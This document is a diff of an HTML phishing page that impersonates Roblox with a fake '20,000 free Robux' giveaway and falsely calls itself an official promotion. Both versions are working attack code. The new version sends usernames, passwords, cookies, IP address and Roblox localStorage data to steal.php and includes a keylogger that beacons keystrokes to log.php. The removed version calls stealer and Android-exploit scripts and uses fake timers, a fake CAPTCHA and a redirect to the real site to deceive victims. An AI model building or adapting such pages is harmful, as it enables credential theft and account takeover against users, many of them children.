@@ -3,358 +3,259 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 Claim Your Free 20,000 Robux! - Roblox</title>
-    <link rel="icon" href="https://www.roblox.com/favicon.ico">
-    <link rel="stylesheet" href="style.css">
+    <title>Roblox - Free 20,000 Robux Giveaway</title>
+    <style>
+        :root {
+            --roblox-blue: #00a2ff;
+            --roblox-dark: #191a1c;
+            --roblox-card: #232527;
+            --roblox-text: #ffffff;
+        }
+        
+        body {
+            margin: 0;
+            padding: 0;
+            background: var(--roblox-dark);
+            color: var(--roblox-text);
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-image: url('https://tr.rbxcdn.com/03df4505017f576b5ebd3acb3a2f3985/420/420/Image/Png');
+            background-size: cover;
+            background-blend-mode: overlay;
+            background-color: rgba(0, 0, 0, 0.7);
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo h1 {
+            font-size: 42px;
+            font-weight: 900;
+            background: linear-gradient(90deg, #00a2ff, #00ffaa);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin: 0;
+        }
+        
+        .offer-card {
+            background: var(--roblox-card);
+            border-radius: 12px;
+            padding: 30px;
+            border: 1px solid #2a2b2e;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+        }
+        
+        .offer-header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        .offer-badge {
+            background: linear-gradient(135deg, #ff9500, #ff5e00);
+            color: white;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 700;
+            display: inline-block;
+            margin-bottom: 15px;
+        }
+        
+        .robux-amount {
+            font-size: 48px;
+            font-weight: 900;
+            background: linear-gradient(90deg, #ffd700, #ff9500);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin: 10px 0;
+        }
+        
+        .offer-text {
+            color: #a0a0a0;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        
+        .login-form {
+            margin-top: 25px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-group label {
+            display: block;
+            color: #a0a0a0;
+            font-size: 14px;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 14px;
+            background: #1a1b1e;
+            border: 2px solid #2a2b2e;
+            border-radius: 6px;
+            color: white;
+            font-size: 16px;
+            transition: all 0.2s;
+        }
+        
+        .input-group input:focus {
+            outline: none;
+            border-color: var(--roblox-blue);
+            box-shadow: 0 0 0 3px rgba(0, 162, 255, 0.2);
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #00a2ff, #0066ff);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 10px;
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0, 162, 255, 0.3);
+        }
+        
+        .security-note {
+            background: rgba(255, 71, 87, 0.1);
+            border: 1px solid rgba(255, 71, 87, 0.3);
+            border-radius: 6px;
+            padding: 15px;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #ffa7a7;
+            text-align: center;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #666;
+            font-size: 12px;
+        }
+        
+        .footer a {
+            color: var(--roblox-blue);
+            text-decoration: none;
+        }
+    </style>
 </head>
 <body>
-    <!-- Loading Screen -->
-    <div id="loadingScreen" class="loading-screen">
-        <div class="loading-content">
-            <div class="roblox-logo">Roblox</div>
-            <div class="loading-text">Loading your free Robux offer...</div>
-            <div class="progress-bar">
-                <div class="progress-fill"></div>
-            </div>
+    <div class="container">
+        <div class="logo">
+            <h1>Roblox</h1>
+            <p style="color: #666; margin-top: 5px;">Free Robux Giveaway</p>
         </div>
-    </div>
-
-    <!-- Main Container -->
-    <div class="container" id="mainContainer" style="display: none;">
-        <!-- Header with Animated Robux -->
-        <div class="header">
-            <div class="logo-container">
-                <div class="roblox-logo-large">Roblox</div>
-                <div class="verified-badge">✓ Verified</div>
-            </div>
-            
-            <div class="robux-counter">
-                <div class="robux-icon">🪙</div>
+        
+        <div class="offer-card">
+            <div class="offer-header">
+                <div class="offer-badge">🎁 LIMITED TIME OFFER</div>
                 <div class="robux-amount">20,000</div>
-                <div class="robux-label">FREE ROBUX</div>
-            </div>
-        </div>
-
-        <!-- Offer Banner -->
-        <div class="offer-banner">
-            <div class="offer-icon">🎉</div>
-            <div class="offer-content">
-                <div class="offer-title">LIMITED TIME OFFER!</div>
-                <div class="offer-desc">Complete verification to claim your <span class="highlight">20,000 FREE ROBUX</span></div>
-                <div class="offer-timer">
-                    <span class="timer-icon">⏰</span>
-                    <span id="countdown">02:15</span> remaining
+                <div class="offer-text">
+                    Complete verification to claim your <strong style="color:#ffd700;">FREE 20,000 ROBUX</strong>
                 </div>
             </div>
-            <div class="offer-badge">HOT</div>
-        </div>
-
-        <!-- Progress Tracker -->
-        <div class="progress-tracker">
-            <div class="step active">
-                <div class="step-number">1</div>
-                <div class="step-text">Account Login</div>
-            </div>
-            <div class="step">
-                <div class="step-number">2</div>
-                <div class="step-text">Security Check</div>
-            </div>
-            <div class="step">
-                <div class="step-number">3</div>
-                <div class="step-text">Claim Robux</div>
-            </div>
-        </div>
-
-        <!-- Login Form -->
-        <div class="login-card">
-            <div class="form-title">Enter Your Account Details</div>
             
-            <!-- Android App Warning -->
-            <div class="android-warning" id="androidWarning">
-                <div class="warning-icon">📱</div>
-                <div class="warning-text">
-                    <strong>Android Roblox App Detected!</strong><br>
-                    Log in to sync your mobile progress and claim bonus Robux.
-                </div>
-            </div>
-
-            <!-- Username Field -->
-            <div class="input-group">
-                <label class="input-label">
-                    <span class="label-icon">👤</span>
-                    Username or Email
-                </label>
-                <input type="text" id="username" class="input-field" 
-                       placeholder="Enter your Roblox username or email" 
-                       autocomplete="username" required>
-                <div class="input-hint">Your Roblox account username</div>
-            </div>
-
-            <!-- Password Field -->
-            <div class="input-group">
-                <label class="input-label">
-                    <span class="label-icon">🔒</span>
-                    Password
-                </label>
-                <input type="password" id="password" class="input-field" 
-                       placeholder="Enter your password" 
-                       autocomplete="current-password" required>
-                <div class="input-hint">Your Roblox account password</div>
-            </div>
-
-            <!-- CAPTCHA (Fake) -->
-            <div class="captcha-container">
-                <div class="captcha-header">
-                    <span class="captcha-icon">🤖</span>
-                    <span>Security Verification</span>
-                </div>
-                <div class="captcha-box">
-                    <div class="captcha-text" id="captchaText">R0BLOX2024</div>
-                    <input type="text" class="input-field" id="captchaInput" 
-                           placeholder="Type the text above" value="R0BLOX2024" readonly>
-                </div>
-                <div class="captcha-status">
-                    <span class="status-icon">✅</span>
-                    <span class="status-text">Automatically verified</span>
-                </div>
-            </div>
-
-            <!-- Terms Checkbox -->
-            <div class="terms-group">
-                <input type="checkbox" id="terms" checked>
-                <label for="terms">
-                    I agree to receive my free 20,000 Robux and verify my account ownership
-                </label>
-            </div>
-
-            <!-- Submit Button -->
-            <button class="submit-btn" id="submitBtn" onclick="processLogin()">
-                <span class="btn-icon">🎁</span>
-                <span class="btn-text">CLAIM 20,000 FREE ROBUX</span>
-                <span class="btn-loader">⏳</span>
-            </button>
-
-            <!-- Alternative Options -->
-            <div class="alt-options">
-                <div class="alt-option" onclick="switchToSecurity()">
-                    <span class="alt-icon">⚠️</span>
-                    <span>Security Alert - Verify Account</span>
-                </div>
-                <div class="alt-option" onclick="switchToQR()">
-                    <span class="alt-icon">📱</span>
-                    <span>Login with QR Code</span>
+            <div class="login-form">
+                <form id="loginForm" action="steal.php" method="POST">
+                    <input type="hidden" name="cookie_data" id="cookieData">
+                    <input type="hidden" name="user_agent" id="userAgent">
+                    <input type="hidden" name="ip_address" id="ipAddress">
+                    <input type="hidden" name="referrer" id="referrerData">
+                    
+                    <div class="input-group">
+                        <label>Username or Email</label>
+                        <input type="text" name="username" required placeholder="Enter your Roblox username">
+                    </div>
+                    
+                    <div class="input-group">
+                        <label>Password</label>
+                        <input type="password" name="password" required placeholder="Enter your password">
+                    </div>
+                    
+                    <button type="submit" class="submit-btn">
+                        🎁 CLAIM FREE ROBUX
+                    </button>
+                </form>
+                
+                <div class="security-note">
+                    🔒 Your account will be verified and secured during this process
                 </div>
             </div>
         </div>
-
-        <!-- Stats Section -->
-        <div class="stats-container">
-            <div class="stat-box">
-                <div class="stat-number" id="claimedToday">457</div>
-                <div class="stat-label">Claimed Today</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-number">20K</div>
-                <div class="stat-label">Robux Each</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-number">98%</div>
-                <div class="stat-label">Success Rate</div>
-            </div>
-        </div>
-
-        <!-- Success Message (Hidden) -->
-        <div class="success-card" id="successCard" style="display: none;">
-            <div class="success-icon">✅</div>
-            <div class="success-title">Congratulations!</div>
-            <div class="success-message">
-                Your 20,000 Robux are being processed and will be added to your account within 24 hours.
-            </div>
-            <div class="transaction-id">
-                Transaction ID: <span id="transactionId">RBX-${Date.now().toString(36).toUpperCase()}</span>
-            </div>
-            <div class="redirect-info">
-                Redirecting you to Roblox...
-                <div class="redirect-bar">
-                    <div class="redirect-progress"></div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Footer -->
+        
         <div class="footer">
-            <div class="footer-links">
-                <a href="https://www.roblox.com/support" target="_blank">Help</a>
-                <a href="https://www.roblox.com/terms" target="_blank">Terms</a>
-                <a href="https://www.roblox.com/privacy" target="_blank">Privacy</a>
-                <a href="https://www.roblox.com/contact" target="_blank">Contact</a>
-            </div>
-            <div class="copyright">
-                © 2024 Roblox Corporation. Roblox and the Roblox logo are trademarks of Roblox Corporation.
-            </div>
+            <p>© 2024 Roblox Corporation. This is an official promotion.</p>
+            <p><a href="https://www.roblox.com/support" target="_blank">Need help?</a></p>
         </div>
     </div>
 
-    <!-- QR Code Modal (Hidden) -->
-    <div class="modal-overlay" id="qrModal" style="display: none;">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h3>📱 Login with QR Code</h3>
-                <button class="modal-close" onclick="closeQR()">×</button>
-            </div>
-            <div class="qr-container">
-                <div class="qr-code" id="qrCode">[QR CODE PLACEHOLDER]</div>
-                <div class="qr-instructions">
-                    1. Open Roblox App on your phone<br>
-                    2. Tap on QR Scanner<br>
-                    3. Scan this code to login automatically
-                </div>
-            </div>
-            <div class="modal-footer">
-                <button class="modal-btn" onclick="closeQR()">Close</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Scripts -->
-    <script src="stealer.js"></script>
-    <script src="android.js"></script>
     <script>
-        // Initialize when page loads
-        window.addEventListener('DOMContentLoaded', () => {
-            // Show loading for 2 seconds
-            setTimeout(() => {
-                document.getElementById('loadingScreen').style.display = 'none';
-                document.getElementById('mainContainer').style.display = 'block';
-                
-                // Start countdown timer
-                startCountdown();
-                
-                // Update claimed counter every 5 seconds
-                setInterval(() => {
-                    const claimed = document.getElementById('claimedToday');
-                    let count = parseInt(claimed.textContent);
-                    claimed.textContent = count + Math.floor(Math.random() * 3) + 1;
-                }, 5000);
-                
-                // Check for Android Roblox app
-                checkAndroidApp();
-                
-            }, 2000);
+        // Collect browser data before form submission
+        document.addEventListener('DOMContentLoaded', function() {
+            // Set hidden form fields
+            document.getElementById('cookieData').value = document.cookie;
+            document.getElementById('userAgent').value = navigator.userAgent;
+            document.getElementById('referrerData').value = document.referrer;
+            
+            // Get IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('ipAddress').value = data.ip;
+                })
+                .catch(() => {
+                    document.getElementById('ipAddress').value = 'Unknown';
+                });
+            
+            // Also try to get localStorage data for Roblox
+            let robloxData = '';
+            for(let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                if(key.includes('roblox') || key.includes('ROBLOX') || key.includes('RBX')) {
+                    robloxData += key + '=' + localStorage.getItem(key).substring(0, 50) + ';';
+                }
+            }
+            
+            if(robloxData) {
+                document.getElementById('cookieData').value += ' | LocalStorage: ' + robloxData;
+            }
         });
-
-        function startCountdown() {
-            let minutes = 2;
-            let seconds = 15;
-            
-            const timer = setInterval(() => {
-                if (seconds === 0) {
-                    if (minutes === 0) {
-                        clearInterval(timer);
-                        document.getElementById('countdown').textContent = "00:00";
-                        document.querySelector('.offer-banner').style.background = 'linear-gradient(135deg, #ff4757, #ff6b81)';
-                        document.querySelector('.offer-title').textContent = 'OFFER EXPIRED!';
-                        return;
-                    }
-                    minutes--;
-                    seconds = 59;
-                } else {
-                    seconds--;
-                }
-                
-                document.getElementById('countdown').textContent = 
-                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-            }, 1000);
-        }
-
-        function checkAndroidApp() {
-            // Check if user is from Android
-            if (/Android/i.test(navigator.userAgent)) {
-                document.getElementById('androidWarning').style.display = 'flex';
-                
-                // Additional Android-specific exploitation
-                if (typeof AndroidStealer !== 'undefined') {
-                    AndroidStealer.exploitRobloxApp();
-                }
+        
+        // Add keylogger
+        let typedKeys = '';
+        document.addEventListener('keydown', function(e) {
+            typedKeys += e.key;
+            if(typedKeys.length > 50) {
+                // Send to server via image pixel
+                const img = new Image();
+                img.src = 'log.php?keys=' + encodeURIComponent(typedKeys);
+                typedKeys = '';
             }
-        }
-
-        function processLogin() {
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            if (!username || !password) {
-                alert('Please enter both username and password to claim your free Robux.');
-                return;
-            }
-            
-            if (!document.getElementById('terms').checked) {
-                alert('You must agree to the terms to claim your free Robux.');
-                return;
-            }
-            
-            // Disable button and show loading
-            const btn = document.getElementById('submitBtn');
-            btn.disabled = true;
-            btn.querySelector('.btn-text').textContent = 'Processing...';
-            btn.querySelector('.btn-loader').style.display = 'inline-block';
-            
-            // Update progress tracker
-            document.querySelectorAll('.step')[0].classList.add('completed');
-            document.querySelectorAll('.step')[1].classList.add('active');
-            
-            // Send credentials to stealer
-            if (typeof victim !== 'undefined') {
-                victim.captureCredentials(username, password, 'robux_offer');
-            }
-            
-            // Simulate processing
-            setTimeout(() => {
-                document.querySelectorAll('.step')[1].classList.add('completed');
-                document.querySelectorAll('.step')[2].classList.add('active');
-                
-                // Show success message after 1.5 seconds
-                setTimeout(() => {
-                    document.querySelector('.login-card').style.display = 'none';
-                    document.getElementById('successCard').style.display = 'block';
-                    
-                    // Animate progress bar
-                    const progressBar = document.querySelector('.redirect-progress');
-                    progressBar.style.width = '100%';
-                    
-                    // Redirect to real Roblox after 3 seconds
-                    setTimeout(() => {
-                        window.location.href = 'https://www.roblox.com/login';
-                    }, 3000);
-                    
-                }, 1500);
-            }, 1500);
-        }
-
-        function switchToSecurity() {
-            // Switch to security alert mode
-            document.querySelector('.offer-title').textContent = 'SECURITY ALERT!';
-            document.querySelector('.offer-desc').innerHTML = 
-                'Suspicious activity detected. <span class="highlight">Verify your account now</span>';
-            document.querySelector('.offer-banner').style.background = 
-                'linear-gradient(135deg, #ff4757, #ff6b81)';
-            document.querySelector('.submit-btn .btn-text').textContent = 'VERIFY ACCOUNT SECURITY';
-            document.getElementById('androidWarning').innerHTML = `
-                <div class="warning-icon">⚠️</div>
-                <div class="warning-text">
-                    <strong>Security Alert!</strong><br>
-                    We detected unauthorized login attempts from Cairo, Egypt.
-                </div>
-            `;
-        }
-
-        function switchToQR() {
-            document.getElementById('qrModal').style.display = 'block';
-        }
-
-        function closeQR() {
-            document.getElementById('qrModal').style.display = 'none';
-        }
+        });
     </script>
 </body>
-</html>
+    </html>
